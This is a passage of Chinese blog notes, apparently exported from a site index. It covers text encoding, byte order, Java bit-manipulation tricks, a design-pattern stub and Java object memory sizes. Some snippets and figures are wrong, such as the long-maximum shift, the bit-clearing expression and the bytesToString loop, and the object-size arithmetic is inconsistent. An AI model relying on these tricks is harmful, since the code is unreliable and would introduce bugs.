为例，ProtocolBuffer定义了一个length mode（enum,int32,int64是000,fixed64是001，String,message是010），拿一个byte出来，先把后面三位填上010，即XXXXX010，然后把3在前面，即00011010，一共只用了一个byte就把String email这句话表示出来了。即protobuffer只需一个byte就能表示key,同样的key，json要12byte（utf-8下一个字母一个byte）。value也是一样，转成hex的形式。印象中http2也是用数字来表示header key的，类似的节省数据的道理。 json是有rfc规范rfc4627的 JSON text SHALL be encoded in Unicode. The default encoding is UTF-8. 8. 补充8.1 Big-ending和Little-endian这名字其实跟文学作品有关 Notepad++可以右下角可以看到当前文件的编码方式，utf-8 dom跟微软有关，最好不要用. Python前面写的”# -- coding: utf-8 --“跟这事有关,”#!/usr/bin/python”是用来说明脚本语言是python的 unicode是字符集，utf-8是一种编码形式。 《格列夫游记》里面，吃鸡蛋先打打头还是小头详解 文档头部放一个BOM (用来表示该文件的字节序，BOM是FFFE或者FEFF，操作系统也就能判断是大端还是小端了)大小端的介绍 全角和半角跟GB2312把一些ASCII里面已有的拉丁字母又编码了一遍有关。 GB2312 是对 ASCII 的中文扩展.在这些编码里，我们还把数学符号、罗马希腊的字母、日文的假名们都编进去了，连在 ASCII 里本来就有的数字、标点、字母都统统重新编了两个字节长的编码，这就是常说的”全角”字符，而原来在127号以下的那些就叫”半角”字符了。 大端小端没有谁优谁劣，各自优势便是对方劣势 大小端的应用 windows记事本会强行给utf-8加上bom，主要是为了兼容旧版本系统。BOM就是（“FE FF”）这么几个二进制，notepad++需要装插件才能看二进制，比较好的解释看这篇.直接用InputStream往文件里写byte数组，接着读出来，编码不对就报错。 很多人都有用记事本编辑代码出错的经历，所以尽量不要用windows下的记事本编辑代码。notepad++默认保存为utf-8不带bom格式，所以编辑文件没什么问题。 只有读取的时候，才必须区分字节序，其他情况都不用考虑。字节序指的是多字节的数据在内存中的存放顺序在一个32位的CPU中“字长”为32个bit，也就是4个byte。在这样的CPU中，总是以4字节对齐的方式来读取或写入内存，那么同样这4个字节的数据是以什么顺序保存在内存中的呢？例如，现在我们要向内存地址为a的地方写入数据0x0A0B0C0D，那么这4个字节分别落在哪个地址的内存上呢？这就涉及到字节序的问题了。网络字节序：TCP/IP各层协议将字节序定义为 Big Endian，因此TCP/IP协议中使用的字节序是大端序。主机字节序：整数在内存中存储的顺序，现在 Little Endian 比较普遍。（不同的 CPU 有不同的字节序）C/C++语言编写的程序里数据存储顺序是跟编译平台所在的CPU相关的，而现在比较普遍的 x86 处理器是 Little EndianJAVA编写的程序则唯一采用 Big Endian 方式来存储数据 一般操作系统都是小端，而通讯协议是大端的。 4.1 常见CPU的字节序 Big Endian : PowerPC、IBM、Sun Little Endian : x86、DEC ARM既可以工作在大端模式，也可以工作在小端模式。 查看当前操作系统的字节序 ```python python3 -c &#39;import sys; print(repr(sys.byteorder))&#39; System.out.println(ByteOrder.nativeOrder()); mac和linux上都输出了‘little’ c语言中htons函数处理了端口号字节序，将short型数据从当前主机字节序转换为网络字节序 //创建sockaddr_in结构体变量 struct sockaddr_in serv_addr; memset(&amp;serv_addr, 0, sizeof(serv_addr)); //每个字节都用0填充 serv_addr.sin_family = AF_INET; //使用IPv4地址 serv_addr.sin_addr.s_addr = inet_addr(&quot;127.0.0.1&quot;); //具体的IP地址 serv_addr.sin_port = htons(1234); //端口号 常见的网络字节转换函数有：htons()：host to network short，将short类型数据从主机字节序转换为网络字节序。ntohs()：network to host short，将short类型数据从网络字节序转换为主机字节序。htonl()：host to network long，将long类型数据从主机字节序转换为网络字节序。ntohl()：network to host long，将long类型数据从网络字节序转换为主机字节序。 另外需要说明的是，sockaddr_in 中保存IP地址的成员为32位整数，而我们熟悉的是点分十进制表示法，例如 127.0.0.1，它是一个字符串，因此为了分配IP地址，需要将字符串转换为4字节整数。 inet_addr() 函数可以完成这种转换。inet_addr() 除了将字符串转换为32位整数，同时还进行网络字节序转换。 为 sockaddr_in 成员赋值时需要显式地将主机字节序转换为网络字节序，而通过 write()/send() 发送数据时TCP协议会自动转换为网络字节序（大端），不需要再调用相应的函数。 C/C++语言编写的程序里数据存储顺序是跟编译平台所在的CPU相关的，而JAVA编写的程序则唯一采用big endian方式来存储数据。试想，如果你用C/C++语言在x86平台下编写的程序跟别人的JAVA程序互通时会产生什么结果？就拿上面的 0x12345678来说，你的程序传递给别人的一个数据，将指向0x12345678的指针传给了JAVA程序，由于JAVA采取big endian方式存储数据，很自然的它会将你的数据翻译为0x78563412。因此，在你的C程序传给JAVA程序之前有必要进行字节序的转换工作。 大小端转化的算法在java这边是这样的参考 /** * 将int转为低字节在前，高字节在后的byte数组 (小端) * @param n int * @return byte[] */ public static byte[] toLH(int n) { byte[] b = new byte[4]; b[0] = (byte) (n &amp; 0xff); b[1] = (byte) (n &gt;&gt; 8 &amp; 0xff); b[2] = (byte) (n &gt;&gt; 16 &amp; 0xff); b[3] = (byte) (n &gt;&gt; 24 &amp; 0xff); // 把高字节拿到后面 return b; } /** * 将int转为高字节在前，低字节在后的byte数组 （大端） * @param n int * @return byte[] */ public static byte[] toHH(int n) { byte[] b = new byte[4]; b[3] = (byte) (n &amp; 0xff); b[2] = (byte) (n &gt;&gt; 8 &amp; 0xff); b[1] = (byte) (n &gt;&gt; 16 &amp; 0xff); b[0] = (byte) (n &gt;&gt; 24 &amp; 0xff); return b; } public static String bytesToString(byte[] b) { StringBuffer result = new StringBuffer(&quot;&quot;); int length = b.length; for (int i=0; i&lt;length; i++) { result.append((char)(b &amp; 0xff)); } return result.toString(); } /** * 将字符串转换为byte数组 * @param s String * @return byte[] */ public static byte[] stringToBytes(String s) { return s.getBytes(); } c语言的转换参考htonl() htons() 从主机字节顺序转换成网络字节顺序ntohl() ntohs() 从网络字节顺序转换为主机字节顺序用c语言检查当前平台大小端 { int i = 1; char *p = (char *)&amp;i; if(*p == 1) printf(&quot;Little Endian&quot;); else printf(&quot;Big Endian&quot;); } 如果是big endian的话，内存里面的存法是 ox00 ox00 ox00 ox01如果是little endian的话，内存里存的是 ox01 ox00 ox00 ox00 union的存放顺序是所有成员都从低地址开始存放，利用该特性就可以轻松地获得了CPU对内存采用Little-endian还是Big-endian模式读写。 /*return 1: little-endian, return 0: big-endian*/ int checkCPUendian() { union { unsigned int a; unsigned char b; }c; c.a = 1; return (c.b == 1); } 实现同样的功能，来看看Linux 操作系统中相关的源代码是怎么做的： static union { char c[4]; unsigned long mylong; } endian_test = {{ &#39;l&#39;, &#39;?&#39;, &#39;?&#39;, &#39;b&#39; } }; #define ENDIANNESS ((char)endian_test.mylong) Linux 的内核作者们仅仅用一个union 变量和一个简单的宏定义就实现了一大段代码同样的功能！（如果ENDIANNESS=’l’表示系统为little endian，为’b’表示big endian） 如果只是字节流，不需要转换（因为网络的字节序都是大端，应用程序层读到的都是大端）。一般是ip地址，端口号码，传输一些整型数的参数，才需要做转换，字节流不需要。如果头部记录了大小的，那么这个记录了大小的整型数需要转换 4.2 常见文件的字节序Adobe PS – Big EndianBMP – Little EndianDXF(AutoCAD) – VariableGIF – Little EndianJPEG – Big EndianMacPaint – Big EndianRTF – Little Endian另外，Java和所有的网络通讯协议都是使用Big-Endian的编码。 ### 8.2 读取一个json文件 先用BufferedSource将文件变成一个Source，再用Moshi从这个Source里面读数据 ### 8.3 从一个byte[]中读取一个int或者写一个int可以这样 在com.square.tape.QueueFile中看到 ```java private static int readInt(byte[] buffer, int offset) { return ((buffer[offset] &amp; 0xff) &lt;&lt; 24) + ((buffer[offset + 1] &amp; 0xff) &lt;&lt; 16) + ((buffer[offset + 2] &amp; 0xff) &lt;&lt; 8) + (buffer[offset + 3] &amp; 0xff); } private static void writeInt(byte[] buffer, int offset, int value) { buffer[offset] = (byte) (value &gt;&gt; 24); buffer[offset + 1] = (byte) (value &gt;&gt; 16); buffer[offset + 2] = (byte) (value &gt;&gt; 8); buffer[offset + 3] = (byte) value; } 一个int占据4个字节，没问题。 有一个一维整型数组int[]data保存的是一张宽为width，高为height的图片像素值信息。请写一个算法，将该图片所有的白色不透明(0xffffffff)像素点的透明度调整为50%。 final int size = data.length; for(int i = 0; i&lt; size; i++){ if(data[i] == 0xffffffff) data[i] = 0x80ffffff; // ARGB_8888 一个像素占据4个bytes，A(alpha)R(red)G(green)B(blue)。所以只要改alpha就好了 } 总结 软件开发能够接触到的最小单位byte就是8个排在一起的可以盛放0或者1的小槽子。从60年代的ASCII到后来的utf-8再到今天的utf-8，成熟的业界标准使得计算机行业能够跨语言形成信息处理，传输，消费的统一化，同时兼顾了效率。 图片只是无数颜色的组合，用byte表示RGB的方式使得电子产品显示图片变为可能。 在数据传输中，数据传输双方可以协商采取合理的传输协议，让通信量变得小，通信速度变快。 hexadecimal简化了写无数个01的过程，日常开发尽量写0xffffff这种形式。两个十六进制数字的组合通常代表一个byte的范围。 根据阮一峰的介绍，目前，Unicode的最新版本是7.0版，一共收入了109449个符号，其中的中日韩文字为74500个。可以近似认为，全世界现有的符号当中，三分之二以上来自东亚文字。 java内存中字符的存储方式是utf-16，因为简单啊，不用像utf-8那样麻烦UTF-16 表示字符非常方便，每两个字节表示一个字符，这个在字符串操作时就大大简化了操作，这也是 Java 以 UTF-16 作为内存的字符存储格式的一个很重要的原因。 这也是为什么 java字符占用两个字节的原因。 而在c语言中，一个字符(char)只需要1个字节 参考 Jesse Wilson | Decoding the Secrets of Binary Data 深入分析 Java 中的中文编码问题IBM出品,非常好，甚至告诉你什么情况下会出现哪种奇怪的显示符号 emoji complete list","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"位运算总结","date":"2017-07-23T19:06:46.000Z","path":"2017/07/23/2017-07-23-manipulating-bits/","text":"位运算的好处至少有两点，由于是直接操作bit,没有任何包装类，速度快。另外一个就是节省内存了。 1.左移（&lt;&lt;）public class Test { public static void main(String[] args) { System.out.println(5&lt;&lt;2);//运行结果是20 } } 原理：5的二进制表示方式是：0000 0000 0000 0000 0000 0000 0000 0101向左挪两位就变成了0000 0000 0000 0000 0000 0000 0001 0100 //末位补零 ，也就是20 可以认为 5&lt;&lt;n就代表乘以2的n次方所以10KB可以这么写 ： 10&lt;&lt;10 2.右移(&gt;&gt;)和左移反过来，前面补0。一样的道理，不再赘述。 3. 无符号右移(&gt;&gt;&gt;)在java中一个int占32位，正数的首位是0，负数位-1。首先说一下负数怎么算出来二进制表示的(原码，补码，反码)在计算机中，负数以其正值的补码形式表达 计算机对有符号数（包括浮点数）的表示有三种方法：原码、反码和补码， 补码=反码+1。在 二进制里，是用 0 和 1 来表示正负的，最高位为符号位，最高位为 1 代表负数，最高位为 0 代表正数。 以-5为例 先将-5的绝对值转成二进制： 00000000 00000000 00000000 00000101 然后求该二进制的反码(~)， 也就是0变成1,1变成0，得到11111111 11111111 11111111 11111010 然后把得到的反码加1 ，得到11111111 11111111 11111111 11111010 + 1 = 11111111 11111111 11111111 11111011 因此-5 就是11111111 11111111 11111111 111110110xFFFFFFFB（16进制写法） 正数右移，高位用0补；负数右移，高位用1补；负数无符号右移，用0补高位。 所以-5&gt;&gt;&gt;3 也就变成了0001 1111 1111 1111 1111 1111 1111 1111 //十进制536870911 注意，正数或者负数左移，低位都是用0补 4. 位与(&amp;)看实例: public static void main(String[] args) { System.out.println(5 &amp; 3);//结果为1 } 原因： 5的二进制是： 0000 0000 0000 0000 0000 0000 0000 0101 3的二进制是： 0000 0000 0000 0000 0000 0000 0000 0011同一位上必须都为1，结果才为1，否则为0；于是结果就得到： 0000 0000 0000 0000 0000 0000 0000 0001 = 1 5. 位或（|）和位与相反同一位上只要有一个为1，就为1.只有两个都为0，才为0.二进制下： 5的二进制是： 0000 0000 0000 0000 0000 0000 0000 0101 3的二进制是： 0000 0000 0000 0000 0000 0000 0000 0011所以结果是 7 0000 0000 0000 0000 0000 0000 0000 0111所以 (5|3) = 7(这让人想到linux文件权限的777) 其实就是 111 111 111 （owner,creater,others） 6. 位异或(^)还是拿5和3一起算第一个操作数的的第n位于第二个操作数的第n位 相反，那么结果的第n为也为1，否则为0二进制下： 5的二进制是： 0000 0000 0000 0000 0000 0000 0000 0101 3的二进制是： 0000 0000 0000 0000 0000 0000 0000 0011所以结果是 6 0000 0000 0000 0000 0000 0000 0000 0110所以a^b可以用来判断两个Flag前后有没有发生变化，有时候如果发现前后flag没有变化，即不操作。 7.位非(~)位非是一元操作符，对一个数进行操作位非：操作数的第n位为1，那么结果的第n位为0，反之为1，就是所有的1变成0,0变成1。 5的二进制是： 0000 0000 0000 0000 0000 0000 0000 0101 倒过来就是： 1111 1111 1111 1111 1111 1111 1111 1010负整数转二进制的标准方法：先是将对应的正整数转换成二进制后，对二进制取反，然后对结果再加一。 8.一些衍生的操作符从上面的一些基本操作符衍生来的有 &amp;= 按位与赋值 |= 按位或赋值 ^= 按位非赋值 &gt;&gt;= 右移赋值 &gt;&gt;&gt;= 无符号右移赋值 &lt;&lt;= 赋值左移 和+=一个意思。至于那个运算符优先级，算了吧。 9.一些常用的小技巧// 1. 获得int型最大值System.out.println((1 &lt;&lt; 31) - 1);// 2147483647， 由于优先级关系，括号不可省略System.out.println(~(1 &lt;&lt; 31));// 2147483647 // 2. 获得int型最小值System.out.println(1 &lt;&lt; 31);System.out.println(1 &lt;&lt; -1); // 3. 获得long类型的最大值System.out.println(((long)1 &lt;&lt; 127) - 1); // 4. 乘以2运算System.out.println(10&lt;&lt;1); // 5. 除以2运算(负奇数的运算不可用)System.out.println(10&gt;&gt;1); // 6. 乘以2的m次方System.out.println(10&lt;&lt;2); // 7. 除以2的m次方System.out.println(16&gt;&gt;2); // 8. 判断一个数的奇偶性System.out.println((10 &amp; 1) == 1);System.out.println((9 &amp; 1) == 1); // 9. 不用临时变量交换两个数（面试常考）a ^= b;b ^= a;a ^= b; // 10. 取绝对值（某些机器上，效率比n&gt;0 ? n:-n 高）int n = -1;System.out.println((n ^ (n &gt;&gt; 31)) - (n &gt;&gt; 31));/* n&gt;&gt;31 取得n的符号，若n为正数，n&gt;&gt;31等于0，若n为负数，n&gt;&gt;31等于-1若n为正数 n^0-0数不变，若n为负数n^-1 需要计算n和-1的补码，异或后再取补码，结果n变号并且绝对值减1，再减去-1就是绝对值 // 11. 取两个数的最大值（某些机器上，效率比a&gt;b ? a:b高）System.out.println(b&amp;((a-b)&gt;&gt;31) | a&amp;(~(a-b)&gt;&gt;31)); // 12. 取两个数的最小值（某些机器上，效率比a&gt;b ? b:a高）System.out.println(a&amp;((a-b)&gt;&gt;31) | b&amp;(~(a-b)&gt;&gt;31)); // 13. 判断符号是否相同(true 表示 x和y有相同的符号， false表示x，y有相反的符号。)System.out.println((a ^ b) &gt; 0);所以在Android的View.java中 void setFlags(int flags, int mask) { final boolean accessibilityEnabled = AccessibilityManager.getInstance(mContext).isEnabled(); final boolean oldIncludeForAccessibility = accessibilityEnabled &amp;&amp; includeForAccessibility(); int old = mViewFlags; mViewFlags = (mViewFlags &amp; ~mask) | (flags &amp; mask); int changed = mViewFlags ^ old; //如果和旧的flag一致，直接return if (changed == 0) { return; } // 以下省略、、、、、、、 } // 14. 计算2的n次方 n &gt; 0System.out.println(2&lt;&lt;(n-1)); // 15. 判断一个数n是不是2的幂System.out.println((n &amp; (n - 1)) == 0);/如果是2的幂，n一定是100… n-1就是1111….所以做与运算结果为0/ // 16. 求两个整数的平均值System.out.println((a+b) &gt;&gt; 1); // 17. 从低位到高位,取n的第m位int m = 2;System.out.println((n &gt;&gt; (m-1)) &amp; 1); // 18. 从低位到高位.将n的第m位置为1System.out.println(n | (1&lt;&lt;(m-1)));/将1左移m-1位找到第m位，得到000…1…000n在和这个数做或运算/ // 19. 从低位到高位,将n的第m位置为0System.out.println(n &amp; ~(0&lt;&lt;(m-1)));/ 将1左移m-1位找到第m位，取反后变成111…0…1111n再和这个数做与运算/ //不用加减乘除计算实现一个加法 public class Solution { public int Add(int num1,int num2) { while (num2!=0) { int temp = num1^num2; num2 = (num1&amp;num2)&lt;&lt;1; num1 = temp; } return num1; } } 牛客网首先看十进制是如何做的： 5+7=12，三步走第一步：相加各位的值，不算进位，得到2。第二步：计算进位值，得到10. 如果这一步的进位值为0，那么第一步得到的值就是最终结果。 第三步：重复上述两步，只是相加的值变成上述两步的得到的结果2和10，得到12。 同样我们可以用三步走的方式计算二进制值相加： 5-101，7-111 第一步：相加各位的值，不算进位，得到010，二进制每位相加就相当于各位做异或操作，101^111。 第二步：计算进位值，得到1010，相当于各位做与操作得到101，再向左移一位得到1010，(101&amp;111)&lt;&lt;1。 第三步重复上述两步， 各位相加 010^1010=1000，进位值为100=(010&amp;1010)&lt;&lt;1。 继续重复上述两步：1000^100 = 1100，进位值为0，跳出循环，1100为最终结果。 结束 记得Chet Haase和Romain Guy曾经在2013年的一次演讲中提到,Android中View内部使用了3个int来表示70多个Flags。如果换做boolean(4byte大小)的话，就需要接近300bytes。由于View在Application中被广泛（成百上千）使用，framework这样做事实上为开发者节约了相当多的内存。View.java里面放了好几个flags。android.view.View.java /* @hide */ public int mPrivateFlags; int mPrivateFlags2; int mPrivateFlags3; // The view flags hold various views states. int mViewFlags; int中的每一个bit都成为一个boolean，一共只用了12bytes(96bits)的内存.和300bytes相比，节省的内存总量还是相当可观的。一个onClickListener大概500bytes所以View.java中到处是这样的奇怪的Flags public void setDrawingCacheEnabled(boolean enabled) { mCachingFailed = false; setFlags(enabled ? 0x00008000 : 0, 0x00008000); } @ViewDebug.ExportedProperty(category = &quot;drawing&quot;) public boolean isDrawingCacheEnabled() { return (mViewFlags &amp; 0x00008000) == 0x00008000; } 除了省内存，位运算速度快也有一定的好处。 来看看Android中的ViewGroup是怎么干的 // Set by default static final int FLAG_CLIP_CHILDREN = 0x1; //二进制的1 private static final int FLAG_CLIP_TO_PADDING = 0x2; //二进制的10 static final int FLAG_INVALIDATE_REQUIRED = 0x4; //二进制 100 private static final int FLAG_RUN_ANIMATION = 0x8; //二进制1000 static final int FLAG_ANIMATION_DONE = 0x10; //二进制 10000 private static final int FLAG_PADDING_NOT_NULL = 0x20;//二进制 100000 /** @deprecated - functionality removed */ private static final int FLAG_ANIMATION_CACHE = 0x40;//二进制 1000000 static final int FLAG_OPTIMIZE_INVALIDATE = 0x80;//二进制 10000000 static final int FLAG_CLEAR_TRANSFORMATION = 0x100;//二进制 100000000 private static final int FLAG_NOTIFY_ANIMATION_LISTENER = 0x200;//二进制 1000000000 protected static final int FLAG_USE_CHILD_DRAWING_ORDER = 0x400;//二进制 10000000000 //还有更多。 if ((flags &amp; FLAG_INVALIDATE_REQUIRED) == FLAG_INVALIDATE_REQUIRED) { //按为与 两个都为1才为1，所以只有当前flag小于FLAG_INVALIDATE_REQUIRED的时候这个表达式才成立 invalidate(true); } java-integer-flag-and-bitwise-operations-for-memory-reductionstackoverflow上有人回答了关于用一个int的flag替代32个boolean的利弊。要点如下: 大多数jvm implementation都以一个int的方式存储boolean如果一个class里面滥用一大堆boolean，但这个class的实例不过几百个，那么也不会有什么影响位运算对于cpu来说非常快jdk提供了BitSet，属于一种开箱即用的bit操作工具 下面是google 关键词 int flag找到的一段java代码。这是代表各种state之间互斥的。 public static final int UPPERCASE = 1; // 0001 public static final int REVERSE = 2; // 0010 public static final int FULL_STOP = 4; // 0100 public static final int EMPHASISE = 8; // 1000 public static final int ALL_OPTS = 15; // 1111 public static String format(String value, int flags) { if ((flags &amp; UPPERCASE) == UPPERCASE) value = value.toUpperCase(); if ((flags &amp; REVERSE) == REVERSE) value = new StringBuffer(value).reverse().toString(); if ((flags &amp; FULL_STOP) == FULL_STOP) value += &quot;.&quot;; if ((flags &amp; EMPHASISE) == EMPHASISE) value = &quot;~*~ &quot; + value + &quot; ~*~&quot;; return value; } 可以想象的是，View中一个int，32个小槽子(bit)，每一位都能用来代表isSelected,isFocused,XXX等属性。检查是否有某个flag只需要 public class BitFlags { public static boolean isFlagSet(byte value, byte flags) { return (flags &amp; value) == value;//和上面的FLAG_INVALIDATE_REQUIRED一模一样 } public static byte setFlag(byte value, byte flags) { return (byte) (flags | value); } public static byte unsetFlag(byte value, byte flags) { return (byte) (flags &amp; ~value); } } 不要迷信位运算，对于一些简单的操作，现代编译器还是能够帮助开发者自动做好优化的。 从java7开始，可以在java代码里直接写二进制，八进制，十六进制的数字了 //16进制 jdk6写法： public static void main(String[] args) { int res = Integer.parseInt(&quot;A&quot;, 16); System.out.println(res); } jdk7写法： public static void main(String[] args) { int res = 0xA; System.out.println(res); } // 8进制 jdk6写法: public static void main(String[] args) { int res = Integer.parseInt(&quot;11&quot;,8); System.out.println(res); } jdk7写法: public static void main(String[] args) { int res = 011; System.out.println(res); } //二进制 jdk6写法: public static void main(String[] args) { int res = Integer.parseInt(&quot;1100110&quot;, 2); System.out.println(res); } jdk7写法: public static void main(String[] args) { int res = 0b1100110; System.out.println(res); } 即：二进制： int res = 0b110; 六（0B也行，0b01_10010_0这种加下划线也行）八进制： int res = 0110; 七十二十六进制： int res = 0xA; 十 View.MeasureSpec就是32位的int前2位是mode(能表示四种，够了),后30位是size文档的定义是：MeasureSpecs are implemented as ints to reduce object allocation. This classis provided to pack and unpack the size, mode tuple into the int就是为了节省内存，才用的位运算 public static class MeasureSpec { private static final int MODE_SHIFT = 30; private static final int MODE_MASK = 0x3 &lt;&lt; MODE_SHIFT; /** @hide */ @IntDef({UNSPECIFIED, EXACTLY, AT_MOST}) @Retention(RetentionPolicy.SOURCE) public @interface MeasureSpecMode {} public static final int UNSPECIFIED = 0 &lt;&lt; MODE_SHIFT;//(就是00后面跟30个0) public static final int EXACTLY = 1 &lt;&lt; MODE_SHIFT;//（就是01后面跟30个0） public static final int AT_MOST = 2 &lt;&lt; MODE_SHIFT;// (就是10后面跟30个0) public static int getMode(int measureSpec) { //noinspection ResourceType return (measureSpec &amp; MODE_MASK); //按位与，都是1才能得到1，就是把一个Int的32位中前两位提取出来 } public static int getSize(int measureSpec) { return (measureSpec &amp; ~MODE_MASK); //按位与加上位非，二进制取反，结果加一 } // ~MODE_MASK就是01后面跟30个0，所以等于直接把measureSpec后三十位拿出来转成int。 } 所以就是一个int存了状态以及大小两部分信息。多说一句measureSpec是在ViewGroup.getChildMeasureSpec里面算出来的，是parent用来跟child交流的，一般用View.resolveSize就知道到底得多大了。 名称 含义 数值（二进制） 具体表现 UNSPECIFIED 父View不对子View 施加任何约束，子View可以是它想要的任何尺寸 00 …(30个0) 系统内部使用 EXACTLY 父View已确定子View 的确切大小，子View的大小为父View测量所得的值 01 …(30个0) 具体数值、match_parent AT_MOST 父View 指定一个子View可用的最大尺寸值，View大小 不能超过该值。 10 …(30个0) wrap_content 参考 Java位运算操作全面总结 Java 位运算(移位、位与、或、异或、非）","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"设计模式总结","date":"2017-07-23T19:03:51.000Z","path":"2017/07/23/2017-07-23-design-pattern/","text":"一般来讲设计模式有23种，这里根据菜鸟教程上的关于设计模式的总结看下来的一些读书笔记，估计要写很久。 设计模式分四大类： 创建型模式 结构型模式 行为型模式 J2EE模式 1. 面向对象的六大原则这个就当背书好了。 单一职责原则 开闭原则 里氏替换原则 依赖倒置原则 接口隔离原则 迪米特原则 2. 23中设计模式简单介绍 工厂模式意图：定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。 做法： 定义一个完成某项功能的接口，功能的具体实现由子类决定，让子类实现工厂接口，返回的也是一个抽象产品。 实例：getSystemService根据传入的参数决定返回什么样的SystemService实例。 抽象工厂模式 单例模式 参考 设计模式大全 从Android代码中来记忆23种设计模式","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"},{"name":"designpattern","slug":"designpattern","permalink":"https://haldir65.github.io/tags/designpattern/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"java对象内存占用分析","date":"2017-07-23T19:02:52.000Z","path":"2017/07/23/2017-07-23-from-java-code-to-java-heap/","text":"面向对象语言就意味着对象要占用内存空间，那么，java中随便new 出来的东西到底多大？还有，new出来的东西全都都放在heap上吗(有些真不是)？ 1.首先给出精确判断Object大小的一种方法一个判断Java Object大小的方法比较精准的确定一个对象的大小的方法: public class ObjectSizeFetcher { private static Instrumentation instrumentation; public static void premain(String args, Instrumentation inst) { instrumentation = inst; } public static long getObjectSize(Object o) { return instrumentation.getObjectSize(o); } } 这样通常在IDE里面跑不起来。 据说dump memory也行，没试过。 2. 内存对齐JVM为了malloc与gc方便，指定分配的每个对象都需要是8字节的整数倍参考简单来说，一个Object占用的内存大小是8 Byte的倍数 3. java进程的内存占用情况3.1 操作系统和runtime占用的内存操作系统的内存中，一部分被操作系统和kernel所占用。对于用c或者c++写的jvm，还需要分配一部分给c runtime。操作系统和cruntime占用的内存比较大，不同的操作系统上不一样，windows上默认是2GB。剩下的内存(即user space)，就是进程可以使用的内存。 3.2 剩下的内存(user space)对于Java进程来讲，这剩下的部分分为两块: Java Heap(s) Native (non-java) Heap Java Heap可以通过-Xms 和 -Xmx 来设置最小值和最大值Native Heap是在分配了java maximum Heap大小之后剩下的大小(jvm占用的内存也算在这里面) 3.3 数据类型大小基本数据类型大小很简单，其实也不简单。这张图是从ibm网站上截下来的注意一个boolean在数组中只占用一个字节，单独使用占用4个字节。原理参考 引用的大小：在 32 位的 JVM 上，一个对象引用占用 4 个字节；在 64 位上，占用 8 个字节。通过 java -d64 -version 可确定是否是 64 位的 JVM。处理器能够处理的bit范围决定了操作系统能够使用的内存范围：32位的cpu(2^32 = 4,294,967,296 bits = 4GB)64位cpu (2^64 = 18,446,744,073,709,551,616 = 16 exabytes)多数jvm是用c或者c++写的: the Java runtime creates an operating-system process — just as if you were running a C-based program. In fact, most JVMs are written largely in C or C++ 查看jvm是否64位的方法: java -d64 -version64位上引用占用大小变大的原因是，需要管理4g以上的内存，指针(内存地址不够用了) 4. java对象内存布局，从一个Integer说起一个class实例占据的大小包括: 自身的大小（对象头+基本数据类型数据大小） - Shadow heap sizeObject自身的大小在不同的jvm版本和厂商之间有一些变化，但大体上包括三个部分: Class ： 一个指针，指向对应的class，用于表明其类型。比如一个Integer就指向java.lang.Integer这个类(32位上4字节，64位上8字节) Flags : A collection of flags that describe the state of the object, including the hash code for the object if it has one, and the shape of the object (that is, whether or not the object is an array).（就是存hash值和用于表示是不是数组的，32位上4字节，64位上8字节） Lock 所有的Object都能lock，这部分内存用于表示当前Object是否是被synchronized(32位上4字节，64位上8字节) 所以，对于java.lang.Integer来说，一个Integer的大小就是：32(class信息)+32(Flags)+32(Lock))+32(int是基本数据类型，4字节) = 128bits（16字节）事实上，一个Interger的大小是int（4个字节）的四倍，简单来说一个对象的头信息就占用了3个字节。 数组的大小数组和普通的object差不多，多了一个size(32字节)。也就是说。为了存储一个int值。使用一个大小为1的int[]数组的内存消耗比一个Integer还要大。（同样，32位4字节，64位8字节）。数组因为多一个size，所以4个字节起步。 8个字节变成4个字节IBM和Oracle的jvm都能够提供ompressed References (-Xcompressedrefs) 和Compressed OOPs (-XX:+UseCompressedOops) 选项。这样一来，原本在64位机器上要占用8个字节的指针就只要占用4个字节了。但这只对java Heap上的内存有效，对于Native Heap这部分，64位占用内存还是要比32位多。所以同样的一份代码，在64位上占用的内存一定比32位上多。jdk 1.6.x之后好像默认是打开了的。 引用的对象的大小(递归即可) - Retained heap size(Shallow Heap大小加上引用的对象的)java.lang.Integer还算比较简单的，里面除了一个int值表示value以外，没有其它的成员变量，所以并没有引用到其他对象的实例。对于复杂一点的数据类型，比如jav.lang.String呢？ String本身是一个很简单的类(如果不算常量池的话)，几乎可以看成一个char数组的wrapper。除了一个普通对象的class、Flag和Locks等信息外，String内部还有一个 private int hash（用于Cache hash值），还有offset和count（这俩好像没找到），此外就是一个char数组了。所以，为了存储8个字符(16个字节,128bits)。首先这个char数组对象占用了16个字节(2*8)+（对象头+数组大小）16个字节 = 256bits。算到String头上，String本身的文件头是12个字节，算上hash,count,offset各自4个字节，就24个字节了。再加上数组的引用4个字节，再加上数组的大小32个字节。合计60个字节（480bits）。而这里面实际有用的数据只有16个字节。73.3%的内存都是存储其他东西的。 说的比较乱了，这里直接照搬一段计算,参考 - 一般而言，Java 对象在虚拟机的结构如下： •对象头（object header）：8 个字节（保存对象的 class 信息、ID、在虚拟机中的状态） •Java 原始类型数据：如 int, float, char 等类型的数据 •引用（reference）：4 个字节 •填充符（padding） String定义： JDK6: private final char value[]; private final int offset; private final int count; private int hash; JDK6的空字符串所占的空间为40字节 JDK7: private final char value[]; private int hash; private transient int hash32; JDK7的空字符串所占的空间也是40字节 JDK6字符串内存占用的计算方式： 首先计算一个空的 char 数组所占空间，在 Java 里数组也是对象，因而数组也有对象头，故一个数组所占的空间为对象头所占的空间加上数组长度，即 8 + 4 = 12 字节 , 经过填充后为 16 字节。 那么一个空 String 所占空间为： 对象头（8 字节）+ char 数组（16 字节）+ 3 个 int（3 × 4 = 12 字节）+1 个 char 数组的引用 (4 字节 ) = 40 字节。 因此一个实际的 String 所占空间的计算公式如下： 8*( ( 8+12+2*n+4+12)+7 ) / 8 = 8*(int) ( ( ( (n) *2 )+43) /8 ) 其中，n 为字符串长度。 小结随便new一个Object就意味着12个Byte没了，数组的话16个字节没了。每添加一个成员变量（指针），4个字节没了。这些都还没算上实际存储的数据。 5. java.util框架中使用的那些集合类5.1 HashSetA HashSet is an implementation of the Set interface。无重复元素，不保证迭代顺序，常规的add,contains等方法速度不会随着内部元素的增加而变慢。HashSet内部最多有一个null，底层实现是HashMap，这意味着其占用内存要比HashMap大。默认容量 16个Entries内部元素为空时的大小 